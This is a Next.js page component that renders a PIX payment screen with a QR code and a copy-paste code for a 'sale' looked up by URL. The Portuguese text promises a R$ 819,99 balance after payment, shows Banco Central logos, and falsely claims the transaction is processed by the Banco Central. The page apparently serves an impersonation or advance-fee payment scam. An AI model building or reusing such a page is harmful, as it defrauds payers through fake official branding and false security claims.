import Logo from '@/assets/pix-banco-central.svg'
import Image from 'next/image'
import BC from '@/assets/bc.png'
import { QrCode } from '@/components/qrcode'
import { ButtonCopy } from '@/components/button-copy'
import { db } from '@/lib/prisma'

interface PayPageProps {
  params: {
    id: string
  }
}

export default async function PayPage({ params }: PayPageProps) {
  const path = params.id

  const sale = await db.sale.findUnique({
    where: {
      path
    }
  })

  if (!sale) {
    return (
      <div className='w-full min-h-screen flex flex-col items-center justify-center gap-2'>
        <h2 className="text-lg font-semibold text-center text-black">
          O código de URL '{path}' não foi encontrado.
        </h2>
        <span className='text-center'>Verifique a URL digitada.</span>
      </div>
    )
  }




  return (
    <div className="w-full relative flex items-center justify-center min-h-screen text-white p-5">
      <div className='w-full rounded-lg p-5 space-y-8'>
        <h2 className="text-3xl font-semibold text-black">Pague com PIX</h2>
        <p className="text-sm text-black">Escaneie o código QR abaixo ou copie o código PIX no seu app de pagamento. E receba seu saldo de <span className="font-bold">R$ 819,99</span> imediatamente em sua conta.</p>


        <QrCode brCode={sale.brCode as string} id={path} />

        <div className="w-full flex flex-col items-center justify-center rounded-lg bg-white shadow-lg py-8 px-5 space-y-6">


          <Image src={Logo} width={80} height={20} alt="image" priority />

          <div className='space-y-2'>
            <p className='text-sm text-black text-center'>1. Copie o código abaixo</p>
            <p className='text-sm text-black text-center'>2. Cole no seu banco na função <span className='font-bold'>PIX Copia e Cola</span></p>
          </div>


          <div className="mx-auto w-full border-2 border-black max-w-sm rounded-3xl overflow-hidden p-2">
            <p className="whitespace-nowrap text-center text-black overflow-hidden">
              {sale.brCode}
            </p>
          </div>


          <ButtonCopy len={sale.brCode as string} />


        </div>

        <p className="text-center text-xs text-black">Essa é uma transação segura, criptografada e processada pelo Banco Central.</p>

        <div className="flex items-center justify-center flex-col pt-16 select-none space-y-1">
          <p className="text-sm text-white">
            Segurança pelo:
          </p>

          <Image src={BC} alt="bc" width={0} height={0} className="w-[200px] h-auto" />
        </div>
      </div>
    </div>
  )
}